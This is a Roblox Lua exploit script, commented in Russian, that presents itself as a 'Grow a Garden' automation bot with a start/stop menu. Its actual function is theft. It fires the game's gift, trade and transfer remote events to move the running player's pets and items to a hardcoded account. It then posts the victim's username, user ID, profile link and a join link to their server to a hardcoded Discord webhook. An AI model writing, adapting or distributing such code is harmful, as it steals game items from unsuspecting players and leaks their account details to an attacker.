--[[
    🌿 GROW A GARDEN BOT - ПРОФЕССИОНАЛЬНАЯ ВЕРСИЯ
    Ссылка на сервер в вебхуке + правильная передача
]]

-- ===== КОНФИГУРАЦИЯ =====
local TARGET_USERNAME = "Sgahfd1223"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1404173568350093424/f_ND3zfZWAHapUMdFRlC77aU0ZdSbPmzFASONMUfhoaguz_zD8j_UDwuAsV5Lvj0rxIz"
local CHECK_INTERVAL = 30
local TRANSFER_DELAY = 0.2

-- ===== СЕРВИСЫ =====
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local CoreGui = game:GetService("CoreGui")

-- ===== ПЕРЕМЕННЫЕ =====
local LocalPlayer = Players.LocalPlayer
local BotEnabled = false
local AttemptCount = 0
local SuccessCount = 0
local MainGUI = nil

-- ===== ФУНКЦИЯ ПОЛУЧЕНИЯ ССЫЛКИ НА СЕРВЕР =====
local function getServerLink()
    return "https://www.roblox.com/games/" .. tostring(game.PlaceId) .. "?jobId=" .. tostring(game.JobId)
end

-- ===== ЛОГГЕР =====
local function log(message)
    print("[🌿] " .. message)
    if MainGUI and MainGUI.LogText then
        MainGUI.LogText.Text = os.date("%H:%M:%S") .. " - " .. message .. "\n" .. MainGUI.LogText.Text
    end
end

-- ===== ПРАВИЛЬНЫЙ ПОИСК REMOTE EVENTS =====
local function findValidRemotes()
    local remotes = {}
    local validPatterns = {
        "gift", "trade", "transfer", "send", "donate", 
        "exchange", "give", "share", "pet", "item"
    }
    
    local function searchInContainer(container)
        pcall(function()
            for _, item in ipairs(container:GetDescendants()) do
                if item:IsA("RemoteEvent") or item:IsA("RemoteFunction") then
                    local name = item.Name:lower()
                    local isValid = false
                    
                    if not name:find("admin") and not name:find("ban") and not name:find("kick") then
                        for _, pattern in ipairs(validPatterns) do
                            if name:find(pattern) then
                                isValid = true
                                break
                            end
                        end
                        
                        if isValid then
                            table.insert(remotes, {
                                Remote = item,
                                Name = item.Name,
                                Type = item.ClassName
                            })
                        end
                    end
                end
            end
        end)
    end
    
    searchInContainer(ReplicatedStorage)
    searchInContainer(game:GetService("ServerScriptService"))
    searchInContainer(game:GetService("StarterPlayer"))
    
    return remotes
end

-- ===== ПРАВИЛЬНАЯ ПЕРЕДАЧА ПРЕДМЕТОВ =====
local function transferItemsProperly(targetPlayer)
    if not targetPlayer then return 0 end
    
    local remotes = findValidRemotes()
    local transferred = 0
    
    log("Найдено RemoteEvents: " .. #remotes)
    
    for _, remoteData in ipairs(remotes) do
        local remote = remoteData.Remote
        local remoteName = remoteData.Name:lower()
        
        local methodsToTry = {}
        
        if remoteName:find("pet") then
            methodsToTry = {"TransferPets", "SendPets", "GiftPets", "GivePets", "DonatePets"}
        elseif remoteName:find("fruit") or remoteName:find("item") then
            methodsToTry = {"TransferItems", "SendItems", "GiftItems", "GiveItems", "DonateItems"}
        else
            methodsToTry = {"TransferAll", "SendAll", "GiftAll", "GiveAll", "DonateAll", "Trade"}
        end
        
        for _, method in ipairs(methodsToTry) do
            local success, result = pcall(function()
                if remote.ClassName == "RemoteEvent" then
                    remote:FireServer(method, targetPlayer)
                else
                    remote:InvokeServer(method, targetPlayer)
                end
                return true
            end)
            
            if success then
                transferred = transferred + 1
                log("✓ " .. remoteData.Name .. ":" .. method)
                task.wait(TRANSFER_DELAY)
                break
            end
        end
    end
    
    return transferred
end

-- ===== ПОИСК ИГРОКА =====
local function findTargetPlayer()
    for _, player in ipairs(Players:GetPlayers()) do
        if player.Name:lower() == TARGET_USERNAME:lower() then
            return player
        end
    end
    return nil
end

-- ===== ПРАВИЛЬНАЯ ОТПРАВКА WEBHOOK С ССЫЛКОЙ НА СЕРВЕР =====
local function sendDiscordWebhook(targetPlayer, transferred)
    if not WEBHOOK_URL or WEBHOOK_URL == "" then return end

    local serverLink = getServerLink()
    
    local payload = {
        embeds = {{
            title = "🌿 Grow a Garden - Transfer Complete",
            color = 65280,
            fields = {
                {name = "👤 From", value = LocalPlayer.Name, inline = true},
                {name = "🎯 To", value = targetPlayer.Name, inline = true},
                {name = "📦 Items", value = tostring(transferred), inline = true},
                {name = "🆔 UserID", value = tostring(LocalPlayer.UserId), inline = true},
                {name = "🔗 Profile", value = "[Click](https://www.roblox.com/users/"..tostring(LocalPlayer.UserId)..")", inline = true},
                {name = "🌐 Server Link", value = "[Join Game](" .. serverLink .. ")", inline = false}
            },
            footer = {text = "Garden Bot | " .. os.date("%d.%m.%Y %H:%M")},
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }

    local jsonData = HttpService:JSONEncode(payload)
    
    local success = false
    
    -- Метод 1: syn.request
    if syn and syn.request then
        success = pcall(function()
            syn.request({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json",
                    ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                },
                Body = jsonData
            })
            return true
        end)
    end
    
    -- Метод 2: http.request
    if not success and http and http.request then
        success = pcall(function()
            http.request({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = jsonData
            })
            return true
        end)
    end
    
    -- Метод 3: game:HttpGet
    if not success then
        success = pcall(function()
            local query = "?wait=true"
            game:HttpGet(WEBHOOK_URL .. query, {
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = jsonData
            })
            return true
        end)
    end
    
    if success then
        log("✓ Webhook отправлен со ссылкой на сервер")
    else
        log("⚠️ Не удалось отправить webhook")
    end
end

-- ===== ГЛАВНОЕ МЕНЮ =====
local function createMainMenu()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "GardenBotGUI"
    screenGui.Parent = CoreGui

    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(0, 500, 0, 400)
    mainFrame.Position = UDim2.new(0.5, -250, 0.5, -200)
    mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
    mainFrame.BorderSizePixel = 0
    mainFrame.Parent = screenGui

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 12)
    corner.Parent = mainFrame

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 60)
    title.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
    title.BorderSizePixel = 0
    title.Text = "🌿 PROFESSIONAL GARDEN BOT"
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.TextSize = 20
    title.Font = Enum.Font.GothamBold
    title.Parent = mainFrame

    local titleCorner = Instance.new("UICorner")
    titleCorner.CornerRadius = UDim.new(0, 12)
    titleCorner.Parent = title

    local content = Instance.new("Frame")
    content.Size = UDim2.new(1, -20, 1, -80)
    content.Position = UDim2.new(0, 10, 0, 70)
    content.BackgroundTransparency = 1
    content.Parent = mainFrame

    local status = Instance.new("TextLabel")
    status.Size = UDim2.new(1, 0, 0, 30)
    status.Text = "🛑 Status: STOPPED"
    status.TextColor3 = Color3.fromRGB(255, 80, 80)
    status.TextSize = 16
    status.Font = Enum.Font.GothamBold
    status.Parent = content

    local info = Instance.new("TextLabel")
    info.Size = UDim2.new(1, 0, 0, 50)
    info.Position = UDim2.new(0, 0, 0, 35)
    info.Text = "🎯 Target: " .. TARGET_USERNAME .. "\n🔄 Attempts: 0\n✅ Success: 0"
    info.TextColor3 = Color3.fromRGB(200, 200, 200)
    info.TextSize = 14
    info.Font = Enum.Font.Gotham
    info.TextXAlignment = Enum.TextXAlignment.Left
    info.Parent = content

    local startBtn = Instance.new("TextButton")
    startBtn.Size = UDim2.new(1, 0, 0, 40)
    startBtn.Position = UDim2.new(0, 0, 0, 95)
    startBtn.BackgroundColor3 = Color3.fromRGB(0, 180, 80)
    startBtn.BorderSizePixel = 0
    startBtn.Text = "🚀 START BOT"
    startBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    startBtn.TextSize = 16
    startBtn.Font = Enum.Font.GothamBold
    startBtn.Parent = content

    local stopBtn = Instance.new("TextButton")
    stopBtn.Size = UDim2.new(1, 0, 0, 40)
    stopBtn.Position = UDim2.new(0, 0, 0, 145)
    stopBtn.BackgroundColor3 = Color3.fromRGB(180, 60, 60)
    stopBtn.BorderSizePixel = 0
    stopBtn.Text = "⏹️ STOP BOT"
    stopBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    stopBtn.TextSize = 16
    stopBtn.Font = Enum.Font.GothamBold
    stopBtn.Parent = content

    local btnCorner = Instance.new("UICorner")
    btnCorner.CornerRadius = UDim.new(0, 8)
    btnCorner.Parent = startBtn
    btnCorner:Clone().Parent = stopBtn

    local logFrame = Instance.new("ScrollingFrame")
    logFrame.Size = UDim2.new(1, 0, 0, 120)
    logFrame.Position = UDim2.new(0, 0, 0, 200)
    logFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
    logFrame.BorderSizePixel = 0
    logFrame.ScrollBarThickness = 6
    logFrame.Parent = content

    local logCorner = Instance.new("UICorner")
    logCorner.CornerRadius = UDim.new(0, 8)
    logCorner.Parent = logFrame

    local logText = Instance.new("TextLabel")
    logText.Size = UDim2.new(1, -10, 1, -10)
    logText.Position = UDim2.new(0, 10, 0, 10)
    logText.BackgroundTransparency = 1
    logText.Text = "🌿 Bot initialized\n✅ Ready to work"
    logText.TextColor3 = Color3.fromRGB(200, 200, 200)
    logText.TextSize = 12
    logText.Font = Enum.Font.Gotham
    logText.TextXAlignment = Enum.TextXAlignment.Left
    logText.TextYAlignment = Enum.TextYAlignment.Top
    logText.TextWrapped = true
    logText.Parent = logFrame

    return {
        Gui = screenGui,
        Status = status,
        Info = info,
        StartBtn = startBtn,
        StopBtn = stopBtn,
        LogText = logText
    }
end

-- ===== ОБНОВЛЕНИЕ СТАТИСТИКИ =====
local function updateStats()
    if MainGUI and MainGUI.Info then
        MainGUI.Info.Text = string.format(
            "🎯 Target: %s\n🔄 Attempts: %d\n✅ Success: %d",
            TARGET_USERNAME, AttemptCount, SuccessCount
        )
    end
end

-- ===== ОСНОВНОЙ ЦИКЛ =====
local function mainLoop()
    while BotEnabled do
        AttemptCount = AttemptCount + 1
        log("Searching for " .. TARGET_USERNAME)
        updateStats()
        
        local targetPlayer = findTargetPlayer()
        
        if targetPlayer then
            log("Found: " .. targetPlayer.Name)
            
            local transferred = transferItemsProperly(targetPlayer)
            
            if transferred > 0 then
                SuccessCount = SuccessCount + 1
                log("Transferred: " .. transferred .. " items")
                sendDiscordWebhook(targetPlayer, transferred)
            else
                log("No items transferred")
            end
        else
            log("Target not found")
        end
        
        task.wait(CHECK_INTERVAL)
    end
end

-- ===== ИНИЦИАЛИЗАЦИЯ =====
log("Initializing Garden Bot...")

if not game:IsLoaded() then
    game.Loaded:Wait()
end

if not Players.LocalPlayer then
    Players.PlayerAdded:Wait()
end

task.wait(2)

MainGUI = createMainMenu()

MainGUI.StartBtn.MouseButton1Click:Connect(function()
    if not BotEnabled then
        BotEnabled = true
        MainGUI.Status.Text = "🟢 Status: RUNNING"
        MainGUI.Status.TextColor3 = Color3.fromRGB(80, 200, 120)
        log("Bot started!")
        spawn(mainLoop)
    end
end)

MainGUI.StopBtn.MouseButton1Click:Connect(function()
    if BotEnabled then
        BotEnabled = false
        MainGUI.Status.Text = "🛑 Status: STOPPED"
        MainGUI.Status.TextColor3 = Color3.fromRGB(200, 80, 80)
        log("Bot stopped")
    end
end)

log("Ready to work!")
updateStats()

return "BOT_ACTIVATED"
